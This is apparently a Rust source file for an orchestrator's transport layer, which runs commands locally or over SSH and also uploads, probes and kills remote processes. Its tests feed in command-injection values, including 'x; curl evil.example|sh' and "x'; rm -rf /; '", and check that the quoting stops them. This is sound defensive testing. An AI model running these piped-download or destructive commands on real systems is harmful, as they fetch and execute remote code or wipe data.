//! How the orchestrator reaches a host (vision doc 5.2 steps 4, 5, 7, 8
//! and 5.4): a child process for `connection="local"`, or the system `ssh`
//! through a ControlMaster session for everything else. The playbook
//! binary never knows which.
//!
//! The master is launched here rather than through `openssh`'s builder so
//! the inventory's `ssh_args` reach the `ssh` command line verbatim; the
//! `openssh` crate then drives the multiplexed session
//! (`Session::resume_mux`).
//!
//! Ctrl-c on the orchestrator must not kill what it spawned: the binary is
//! told to stop with a `Cancel` frame and gets ten seconds (vision doc 5.5).
//! Local children therefore start in their own process group, and the
//! session is resumed with the native mux client so no per-command `ssh`
//! process sits in the terminal's foreground group; the master itself is
//! daemonized by ssh (`-f`).

use std::path::Path;
use std::pin::Pin;
use std::sync::Arc;

use anyhow::{Context, Result, bail};
use openssh::Session;
use tokio::io::{AsyncRead, AsyncReadExt, AsyncWrite, AsyncWriteExt};

/// The connection parameters a host resolved to, as the transport needs
/// them. `user` and `port` are `None` when the inventory left them to the
/// built-in default, so `~/.ssh/config` keeps the last word (vision 5.4).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshTarget {
    pub addr: String,
    pub user: Option<String>,
    pub port: Option<u16>,
    pub args: Vec<String>,
}

pub enum Transport {
    Local,
    Ssh {
        session: Arc<Session>,
        /// Holds the control socket; removed when the transport is dropped.
        _dir: tempfile::TempDir,
    },
}

/// What the bootstrap probe learns (vision 5.2 step 5).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Probe {
    /// The musl triple to build for.
    pub triple: String,
    /// The login user's `$HOME`, absolute; every later path hangs off it.
    pub home: String,
}

/// A running remote process with piped stdio.
pub struct Proc {
    pub stdin: Pin<Box<dyn AsyncWrite + Send>>,
    pub stdout: Pin<Box<dyn AsyncRead + Send>>,
    stderr: Pin<Box<dyn AsyncRead + Send>>,
    waiter: Waiter,
    /// What `kill` needs if this process has to be stopped. `None` for a
    /// process that is never a kill target (the upload shell).
    kill: Option<KillTarget>,
}

/// What stopping a playbook binary takes, all of it decided by the caller
/// rather than recovered from `argv`: behind `sudo -n -u <someone-not-root>`
/// the binary is the fifth word, not the first non-flag one, and a killed
/// process runs no destructor so its temp directory has to be named from
/// outside. See `run::exec_argv`'s test.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct KillTarget {
    /// Absolute path of the executable to hunt for.
    pub binary: String,
    /// Basename of the run's temp directory, under the target's `TMPDIR`.
    pub run_dir: String,
    /// The escalation prefix the binary was launched with. The directory
    /// belongs to whoever that is, so removing it needs the same prefix.
    pub escalate: Vec<String>,
}

enum Waiter {
    Local(tokio::process::Child),
    Ssh(Option<openssh::Child<Arc<Session>>>),
    Done(i32),
}

impl Proc {
    pub async fn wait(&mut self) -> Result<i32> {
        let code = match &mut self.waiter {
            Waiter::Local(c) => c.wait().await?.code().unwrap_or(-1),
            Waiter::Ssh(c) => match c.take() {
                Some(child) => child.wait().await?.code().unwrap_or(-1),
                None => bail!("wait called twice"),
            },
            Waiter::Done(code) => *code,
        };
        self.waiter = Waiter::Done(code);
        Ok(code)
    }

    pub async fn stderr_text(&mut self) -> String {
        let mut s = String::new();
        let _ = self.stderr.read_to_string(&mut s).await;
        s
    }
}

/// The `ssh` command that opens the ControlMaster for `target`: forks after
/// authentication (`-f -N`), keeps the socket alive between commands, and
/// never prompts (`BatchMode`). Inventory `ssh_args` go in verbatim, after
/// ours so they can override them.
pub fn master_argv(ctl: &Path, log: &Path, target: &SshTarget) -> Vec<String> {
    let mut argv: Vec<String> = [
        "-E",
        &log.display().to_string(),
        "-S",
        &ctl.display().to_string(),
        "-M",
        "-f",
        "-N",
        "-o",
        "ControlPersist=300",
        "-o",
        "BatchMode=yes",
        "-o",
        "StrictHostKeyChecking=accept-new",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    if let Some(p) = target.port {
        argv.push("-p".into());
        argv.push(p.to_string());
    }
    if let Some(u) = &target.user {
        argv.push("-l".into());
        argv.push(u.clone());
    }
    argv.extend(target.args.iter().cloned());
    argv.push("--".into());
    argv.push(target.addr.clone());
    argv
}

/// `uname -sm` output to the musl triple the binary is built for.
pub fn triple_for(uname: &str) -> Result<String> {
    Ok(match uname.trim() {
        "Linux x86_64" => "x86_64-unknown-linux-musl".into(),
        "Linux aarch64" => "aarch64-unknown-linux-musl".into(),
        other => {
            bail!("unsupported target {other:?}; rustible builds for Linux x86_64 and aarch64")
        }
    })
}

/// Single-quote for `sh`.
pub fn shell_quote(s: &str) -> String {
    format!("'{}'", s.replace('\'', "'\\''"))
}

impl Transport {
    pub async fn ssh(target: &SshTarget) -> Result<Transport> {
        let dir = tempfile::Builder::new()
            .prefix(".rustible-ssh")
            .tempdir()
            .context("creating the ssh control directory")?;
        let ctl = dir.path().join("master");
        let log = dir.path().join("log");
        let status = tokio::process::Command::new("ssh")
            .args(master_argv(&ctl, &log, target))
            .stdin(std::process::Stdio::null())
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await
            .context("running ssh")?;
        if !status.success() {
            let detail = std::fs::read_to_string(&log).unwrap_or_default();
            let detail = detail.trim();
            bail!(
                "ssh to {}{}",
                target.addr,
                if detail.is_empty() {
                    format!(": exit {}", status.code().unwrap_or(-1))
                } else {
                    format!(": {detail}")
                }
            );
        }
        let session = Session::resume_mux(ctl.into_boxed_path(), Some(log.into_boxed_path()));
        session
            .check()
            .await
            .with_context(|| format!("ssh master for {} did not answer", target.addr))?;
        Ok(Transport::Ssh {
            session: Arc::new(session),
            _dir: dir,
        })
    }

    /// Tear the master down. Dropping the transport removes the socket
    /// directory anyway; this ends the `ssh` process now instead of at
    /// `ControlPersist`.
    pub async fn close(self) {
        if let Transport::Ssh { session, _dir } = self
            && let Ok(s) = Arc::try_unwrap(session)
        {
            let _ = s.close().await;
        }
    }

    /// Run a shell snippet; stdout and stderr captured. The bootstrap probe
    /// and the cache check use this; everything else is the static binary.
    async fn sh(&self, script: &str) -> Result<(i32, String, String)> {
        let out = match self {
            Transport::Local => {
                tokio::process::Command::new("sh")
                    .arg("-c")
                    .arg(script)
                    .process_group(0)
                    .output()
                    .await?
            }
            Transport::Ssh { session, .. } => {
                session.command("sh").arg("-c").arg(script).output().await?
            }
        };
        Ok((
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stdout).into_owned(),
            String::from_utf8_lossy(&out.stderr).into_owned(),
        ))
    }

    /// One shell round trip: the machine's triple and `$HOME`.
    pub async fn probe(&self) -> Result<Probe> {
        let (code, out, err) = self.sh("uname -sm && printf '%s\\n' \"$HOME\"").await?;
        if code != 0 {
            bail!("probe failed with exit {code}: {}", err.trim());
        }
        let mut lines = out.lines();
        let uname = lines.next().unwrap_or_default();
        let home = lines.next().unwrap_or_default().trim().to_string();
        if !home.starts_with('/') {
            bail!("probe returned a $HOME that is not absolute: {home:?}");
        }
        Ok(Probe {
            triple: triple_for(uname)?,
            home,
        })
    }

    pub async fn exists(&self, abs_path: &str) -> Result<bool> {
        let (code, _, _) = self
            .sh(&format!("test -x {}", shell_quote(abs_path)))
            .await?;
        Ok(code == 0)
    }

    /// Stream bytes to `abs_path` through the process's stdin, then
    /// atomically move into place and mark executable.
    pub async fn upload(&self, bytes: &[u8], abs_path: &str) -> Result<()> {
        let p = shell_quote(abs_path);
        // The temp name carries the remote shell's pid: the final path is a
        // content hash, so two runs uploading the same binary at once would
        // otherwise interleave into one `$p.tmp`, and `mv` would publish the
        // mixture. `exists` only tests for an executable file, so that
        // corruption would then be a cache hit forever.
        let script = format!(
            "set -e; p={p}; t=\"$p.$$.tmp\"; trap 'rm -f \"$t\"' EXIT; \
             mkdir -p \"$(dirname \"$p\")\"; \
             cat > \"$t\"; chmod 755 \"$t\"; mv \"$t\" \"$p\""
        );
        let mut proc = self
            .spawn(&["sh".into(), "-c".into(), script], None)
            .await?;
        proc.stdin.write_all(bytes).await?;
        proc.stdin.shutdown().await?;
        // Close our handle so the remote sees EOF, then wait.
        proc.stdin = Box::pin(tokio::io::sink());
        let code = proc.wait().await?;
        if code != 0 {
            bail!(
                "upload to {abs_path} failed with exit {code}: {}",
                proc.stderr_text().await.trim()
            );
        }
        Ok(())
    }

    /// Spawn `argv` with piped stdio, no shell in between: paths are
    /// absolute by now and `openssh` quotes each argument for the remote
    /// shell. `kill` describes how to stop this process later, `None` when
    /// it is never cancelled (the upload shell).
    pub async fn spawn(&self, argv: &[String], kill: Option<KillTarget>) -> Result<Proc> {
        let (prog, rest) = argv.split_first().context("empty argv")?;
        match self {
            Transport::Local => {
                let mut child = tokio::process::Command::new(prog)
                    .args(rest)
                    .stdin(std::process::Stdio::piped())
                    .stdout(std::process::Stdio::piped())
                    .stderr(std::process::Stdio::piped())
                    // Its own process group, so ctrl-c in the terminal is
                    // delivered to the orchestrator alone and `Cancel` gets
                    // its grace period.
                    .process_group(0)
                    .spawn()
                    .with_context(|| format!("spawning {}", argv.join(" ")))?;
                Ok(Proc {
                    stdin: Box::pin(child.stdin.take().unwrap()),
                    stdout: Box::pin(child.stdout.take().unwrap()),
                    stderr: Box::pin(child.stderr.take().unwrap()),
                    waiter: Waiter::Local(child),
                    kill,
                })
            }
            Transport::Ssh { session, .. } => {
                let mut child = session
                    .clone()
                    .arc_command(prog.clone())
                    .args(rest)
                    .stdin(openssh::Stdio::piped())
                    .stdout(openssh::Stdio::piped())
                    .stderr(openssh::Stdio::piped())
                    .spawn()
                    .await
                    .with_context(|| format!("spawning {} over ssh", argv.join(" ")))?;
                Ok(Proc {
                    stdin: Box::pin(child.stdin().take().unwrap()),
                    stdout: Box::pin(child.stdout().take().unwrap()),
                    stderr: Box::pin(child.stderr().take().unwrap()),
                    waiter: Waiter::Ssh(Some(child)),
                    kill,
                })
            }
        }
    }

    /// Stop a process that ignored `Cancel` for too long. Locally the whole
    /// process group goes (the binary and any helper it spawned); over SSH
    /// every process running the binary's path is killed, since the mux
    /// channel cannot signal the remote process.
    pub async fn kill(&self, proc: &mut Proc) -> Result<()> {
        let target = proc.kill.clone();
        let killed = match (&mut proc.waiter, self) {
            (Waiter::Local(child), _) => {
                if let Some(pid) = child.id() {
                    // Negative pid: the process group we created at spawn.
                    let _ = tokio::process::Command::new("kill")
                        .args(["-KILL", "--", &format!("-{pid}")])
                        .status()
                        .await;
                }
                child.start_kill().ok();
                true
            }
            (Waiter::Ssh(_), Transport::Ssh { .. }) => {
                // The mux channel cannot signal the remote process, so the
                // binary and its children (a step's command, a helper) are
                // killed by pid. `pgrep -f` is only the candidate list: the
                // pattern is the binary's path, and this script's own shell
                // has that path on its command line too, so a bare `pgrep
                // -f` loop kills the killer and whichever of the real
                // targets it had not reached yet. `/proc/<pid>/exe` is the
                // filter that tells the two apart.
                let Some(t) = &target else {
                    bail!("no kill target for this process");
                };
                self.sh(&kill_script(t)).await?;
                true
            }
            _ => false,
        };
        // A killed process runs no destructor, so the run's temp directory
        // and every streamed file in it stay behind. Nothing else ever
        // collects them, so the side that did the killing clears up. Doing
        // it after the kill, not before, means the binary cannot recreate
        // it; `rm -rf` on a directory that is already gone is not an error,
        // so a run that ended cleanly is unaffected.
        if killed && let Some(t) = &target {
            self.sh(&remove_run_dir_script(t)).await?;
        }
        Ok(())
    }
}

/// The remote snippet that kills the binary and its children. Only
/// processes actually running it are signalled: `/proc/<pid>/exe` is the
/// kernel's answer to "what is this process running", where a command line
/// is just text that anything, this script included, can carry.
///
/// It runs behind the binary's own escalation prefix, because both halves
/// need the identity that owns the processes. `/proc/<pid>/exe` is not
/// readable for another user's process (it needs ptrace access), so an
/// unescalated script skips every candidate of an escalated run at the
/// guard, and `kill` would be refused even if it reached one. Such a run
/// used to survive this script entirely and die from the ssh session being
/// torn down, which is luck rather than cancellation.
fn kill_script(t: &KillTarget) -> String {
    let q = shell_quote(&t.binary);
    let inner = format!(
        "for p in $(pgrep -f {q}); do \
           [ \"$(readlink /proc/$p/exe 2>/dev/null)\" = {q} ] || continue; \
           pkill -KILL -P \"$p\"; kill -KILL \"$p\"; \
         done 2>/dev/null; true"
    );
    match escalation_words(&t.escalate) {
        None => inner,
        Some(esc) => format!("{esc} sh -c {}", shell_quote(&inner)),
    }
}

/// The escalation prefix as shell words, each quoted. `escalate_user` comes
/// from the inventory unvalidated, and the inventory is data in our model:
/// everywhere else it reaches the target as an argv element that `openssh`
/// quotes, and only these scripts put it through a shell, so they quote it
/// themselves. `None` when nothing escalates.
fn escalation_words(prefix: &[String]) -> Option<String> {
    if prefix.is_empty() {
        return None;
    }
    Some(
        prefix
            .iter()
            .map(|w| shell_quote(w))
            .collect::<Vec<_>>()
            .join(" "),
    )
}

/// Remove the run's temp directory on the target.
///
/// `${TMPDIR:-/tmp}` is resolved on the target, by the same session that
/// launched the binary, so it matches what Rust's `env::temp_dir` chose
/// there. The escalation prefix is the one the binary ran behind: an
/// escalated run creates the directory as that user, and only that user
/// can remove it.
fn remove_run_dir_script(t: &KillTarget) -> String {
    let dir = shell_quote(&t.run_dir);
    // `$TMPDIR` is expanded by the session's own shell and `rm` gets the
    // result as an argument. Expanding it inside an escalated shell would
    // read root's environment, not the one the binary ran with.
    let path = format!("\"${{TMPDIR:-/tmp}}\"/{dir}");
    match escalation_words(&t.escalate) {
        None => format!("rm -rf -- {path}; true"),
        Some(esc) => format!("{esc} rm -rf -- {path}; true"),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_run_directory_is_removed_as_whoever_created_it() {
        let unescalated = KillTarget {
            binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
            run_dir: ".rustible-1a2b".into(),
            escalate: vec![],
        };
        let script = remove_run_dir_script(&unescalated);
        // TMPDIR is resolved on the target, by the session that launched
        // the binary, so it matches what `env::temp_dir` chose there.
        assert!(
            script.contains("\"${TMPDIR:-/tmp}\"/'.rustible-1a2b'"),
            "{script}"
        );
        assert!(!script.contains("sudo"), "{script}");

        // Escalated, the directory belongs to the escalated user and only
        // that user can remove it.
        let as_root = KillTarget {
            escalate: vec!["sudo".into(), "-n".into()],
            ..unescalated.clone()
        };
        assert!(
            remove_run_dir_script(&as_root).starts_with("'sudo' '-n' rm -rf --"),
            "{}",
            remove_run_dir_script(&as_root)
        );
        let as_admin = KillTarget {
            escalate: vec!["sudo".into(), "-n".into(), "-u".into(), "admin".into()],
            ..unescalated.clone()
        };
        assert!(
            remove_run_dir_script(&as_admin).starts_with("'sudo' '-n' '-u' 'admin' rm -rf --"),
            "{}",
            remove_run_dir_script(&as_admin)
        );

        // The name arrives over the wire; it cannot close the quoting.
        let nasty = KillTarget {
            run_dir: "x'; rm -rf /; '".into(),
            ..unescalated.clone()
        };
        let script = remove_run_dir_script(&nasty);
        assert!(!script.contains("x'; rm -rf /"), "{script}");
    }

    /// `escalate_user` is an unvalidated string from the KDL inventory. It
    /// is safe everywhere else because `exec_argv` passes it as argv and
    /// `openssh` quotes each element; these two scripts are the only place
    /// it goes through a shell, so they quote it themselves.
    #[test]
    fn an_escalate_user_with_shell_metacharacters_is_quoted_not_run() {
        let evil = KillTarget {
            binary: "/home/x/.cache/rustible/bin/p-ab".into(),
            run_dir: ".rustible-1a".into(),
            escalate: vec![
                "sudo".into(),
                "-n".into(),
                "-u".into(),
                "x; curl evil.example|sh".into(),
            ],
        };
        for script in [kill_script(&evil), remove_run_dir_script(&evil)] {
            // One quoted word, so `sh` passes it to sudo as a username
            // rather than ending the command and running `curl`.
            assert!(
                script.contains("'x; curl evil.example|sh'"),
                "expected the user quoted as one word: {script}"
            );
            assert!(
                !script.contains(" x; curl"),
                "the payload appears as a bare word: {script}"
            );
        }
    }

    /// An escalated run's processes belong to the escalated user, and
    /// `/proc/<pid>/exe` is not readable for another user's process, so an
    /// unescalated kill script skips every candidate at its own guard.
    #[test]
    fn the_kill_script_runs_as_the_identity_that_owns_the_processes() {
        let plain = KillTarget {
            binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
            run_dir: ".rustible-1a".into(),
            escalate: vec![],
        };
        assert!(kill_script(&plain).starts_with("for p in $(pgrep -f "));

        let as_root = KillTarget {
            escalate: vec!["sudo".into(), "-n".into()],
            ..plain
        };
        let script = kill_script(&as_root);
        assert!(script.starts_with("'sudo' '-n' sh -c "), "{script}");
        // The inner script's own expansions survive the nesting.
        assert!(script.contains("pgrep -f "), "{script}");
        assert!(script.contains("readlink /proc/"), "{script}");
    }

    #[test]
    fn kill_script_only_signals_processes_running_the_binary() {
        let bare = |bin: &str| KillTarget {
            binary: bin.into(),
            run_dir: ".rustible-1a".into(),
            escalate: vec![],
        };
        let script = kill_script(&bare("/home/cadu/.cache/rustible/bin/cadu_slow-ab12"));
        // The path is quoted once for `pgrep` and once for the comparison,
        // and nothing is killed before `/proc/<pid>/exe` has been checked.
        assert_eq!(
            script
                .matches("'/home/cadu/.cache/rustible/bin/cadu_slow-ab12'")
                .count(),
            2
        );
        let guard = script.find("readlink /proc/$p/exe").expect("checks exe");
        assert!(guard < script.find("kill -KILL").expect("kills"));
        // A path with a quote in it cannot close the quoting and run
        // something: the quote comes back escaped, never bare.
        let nasty = kill_script(&bare("/tmp/x'; rm -rf /; '"));
        assert!(!nasty.contains("x'; rm"), "{nasty}");
        assert!(nasty.contains("x'\\''; rm"), "{nasty}");
    }

    #[test]
    fn master_argv_passes_only_what_the_inventory_set() {
        let ctl = Path::new("/tmp/x/master");
        let log = Path::new("/tmp/x/log");
        let bare = SshTarget {
            addr: "arm".into(),
            user: None,
            port: None,
            args: vec![],
        };
        let argv = master_argv(ctl, log, &bare);
        assert!(!argv.contains(&"-l".to_string()));
        assert!(!argv.contains(&"-p".to_string()));
        assert_eq!(&argv[argv.len() - 2..], ["--", "arm"]);
        assert!(argv.windows(2).any(|w| w == ["-o", "BatchMode=yes"]));

        let full = SshTarget {
            addr: "10.0.0.1".into(),
            user: Some("deploy".into()),
            port: Some(2222),
            args: vec!["-4".into(), "-o".into(), "ConnectTimeout=5".into()],
        };
        let argv = master_argv(ctl, log, &full);
        assert!(argv.windows(2).any(|w| w == ["-p", "2222"]));
        assert!(argv.windows(2).any(|w| w == ["-l", "deploy"]));
        assert_eq!(
            &argv[argv.len() - 5..],
            ["-4", "-o", "ConnectTimeout=5", "--", "10.0.0.1"]
        );
    }

    #[test]
    fn triples() {
        assert_eq!(
            triple_for("Linux x86_64\n").unwrap(),
            "x86_64-unknown-linux-musl"
        );
        assert_eq!(
            triple_for("Linux aarch64").unwrap(),
            "aarch64-unknown-linux-musl"
        );
        assert!(triple_for("Darwin arm64").is_err());
    }

    #[test]
    fn quoting() {
        assert_eq!(shell_quote("/home/a b"), "'/home/a b'");
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    /// Probing the machine the tests run on. Split by platform because the
    /// probe answers what the machine *is*: a Linux host is a target Rustible
    /// builds for, and a mac is a controller that Rustible refuses to target
    /// (vision 5.3: Linux musl only). Both halves are the product behaving
    /// correctly, so both are asserted rather than one being skipped.
    #[tokio::test]
    async fn local_probe_and_exists() {
        let t = Transport::Local;
        assert!(t.exists("/bin/sh").await.unwrap());
        assert!(!t.exists("/definitely/not/here").await.unwrap());

        let probed = t.probe().await;
        if cfg!(target_os = "linux") {
            let p = probed.unwrap();
            assert!(p.home.starts_with('/'));
            assert!(p.triple.ends_with("-unknown-linux-musl"));
        } else {
            // A mac can drive Rustible; it cannot be driven by it.
            let e = probed.unwrap_err().to_string();
            assert!(e.contains("unsupported target"), "{e}");
            assert!(e.contains("Linux"), "{e}");
        }
    }
}
